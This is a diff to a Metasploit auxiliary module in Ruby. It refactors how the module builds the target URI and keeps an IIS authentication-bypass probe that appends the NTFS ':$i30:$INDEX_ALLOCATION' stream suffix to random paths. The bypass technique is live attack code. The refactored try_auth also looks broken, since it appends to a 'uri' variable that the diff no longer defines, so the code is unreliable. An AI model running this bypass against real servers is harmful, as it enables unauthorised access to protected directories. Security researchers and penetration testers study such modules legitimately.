@@ -41,13 +41,15 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 	end
 
-
-	def has_auth
+	def base
 		uri = target_uri.path
 		uri << '/' if uri[-1, 1] != '/'
+		return uri
+	end
 
+	def has_auth
 		res = send_request_cgi({
-			'uri' => uri,
+			'uri' => base,
 			'method' => 'GET'
 		})
 		vprint_status(res.body) if res
@@ -56,8 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def try_auth
-		uri = target_uri.path
-		uri << '/' if uri[-1, 1] != '/'
+		uri << base
 		uri << Rex::Text.rand_text_alpha(rand(10)+5) + ".#{Rex::Text.rand_text_alpha(3)}"
 
 		dir = File.dirname(uri) + ':$i30:$INDEX_ALLOCATION' + '/'
